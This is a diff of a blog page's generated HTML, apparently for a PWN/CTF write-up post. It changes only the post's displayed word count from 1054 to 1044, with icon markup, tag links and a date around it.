@@ -697,7 +698,7 @@ canary <span style="color:#f92672">=</span> p[stop:start<span style="color:#f926
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kuekiko.top/tags/pwn">PWN</a></span><span class="tag"><a href="https://kuekiko.top/tags/ctf">CTF</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1054 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1044 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2019-02-20 00:17 &#43;0800</p>
         </div>
